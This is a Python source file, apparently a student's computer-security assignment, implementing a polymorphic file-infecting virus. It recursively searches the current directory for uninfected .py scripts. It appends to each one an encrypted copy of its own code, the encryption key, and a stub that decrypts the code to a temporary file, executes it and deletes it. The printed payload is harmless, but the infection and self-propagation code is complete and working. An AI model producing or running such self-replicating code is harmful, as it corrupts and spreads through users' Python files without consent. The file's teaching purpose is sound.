''' Name: Chandrawanshi Mangesh Shivaji
    Assignment 2 : Polymorphic Virus 
    CS547 : Foundation of Computer Security
    Roll No. : 1801CS16 '''

import os, inspect
from random import randint
from cryptography.fernet import Fernet

DATA_TO_INSERT = "VIRUS ALREADY PRESENT!"

dec="""
fernet = Fernet(key)
decMessage = fernet.decrypt(encMessage).decode()
f = open("virus_copy.py","w")
f.write(decMessage)
f.close()
os.system('python virus_copy.py')
os.remove('virus_copy.py')
"""

# Generate Encryption Key 
key = Fernet.generate_key()
fernet = Fernet(key)

# To store the encrypted code
encMessage=b""

# Search for target files (.py extension) in path
def selectTarget(path):
    
    filestoinfect = []
    filelist = os.listdir(path)

    for filename in filelist:

        #Extend search in case of a folder    
        if os.path.isdir(path+"/"+filename):
            filestoinfect.extend(selectTarget(path+"/"+filename))

        #If it is a python script -> Infect it	
        elif filename[-3:] == ".py":
            infected = False
            for line in open(path+"/"+filename):
                if DATA_TO_INSERT in line:  
                    # means file is already infected
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+filename)
    return filestoinfect

def copyCode(filestoinfect, virusstring):

    #encrypt virus and write to target file
    global encMessage
    encMessage= fernet.encrypt(virusstring.encode())

    for fname in filestoinfect:
        f = open(fname,"a")
        f.write("\n\n\nfrom cryptography.fernet import Fernet\nimport os\n")
        f.write("DATA_TO_INSERT ="+"\"VIRUS ALREADY PRESENT!\""+"\n")
        f.close()

    for fname in filestoinfect:
        f = open(fname,"a")
        f.write("encMessage=" + "b\"\"\"")
        f.close()
    
    for fname in filestoinfect:
        f = open(fname,"ab")
        f.write(encMessage)
        f.close()

    for fname in filestoinfect:
        f = open(fname,"a")
        f.write("\"\"\"")
        f.close()
    
    for fname in filestoinfect:
        f = open(fname,"a")
        f.write("\nkey="+"\"\"\"")
        f.close()

    for fname in filestoinfect:
        f = open(fname,"ab")
        f.write(key)
        f.close()

    for fname in filestoinfect:
        f = open(fname,"a")
        f.write("\"\"\"" + "\n")
        f.close()
        
    for fname in filestoinfect:
        f = open(fname,"a")
        f.write(dec)
        f.close()
        
#payload to be called when nothing to infect
def payload():
    print("*******************************************************")
    print ("NO TARGET FILE FOUND!")
    print("HARMLESS PAYLOAD() CALLED!")
    print("*******************************************************")

def infect():
    
    #Get files to infect
    filestoinfect = selectTarget(os.path.abspath("./"))
    print("Just for information purpose (No virus will print the files infected by it)")
    print("FILES INFECTED!")
    print(filestoinfect)

    # Call payload() with 1/4 probability in case of no file to infect
    if len(filestoinfect)==0:
        if randint(0,3) == 0:
            payload()

    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <137:
            virusstring += line
    virus.close
        
    copyCode(filestoinfect, virusstring)
    
    global decMessage
    # Decrypt the encrypted code
    decMessage = fernet.decrypt(encMessage).decode()

# Call infect
infect()
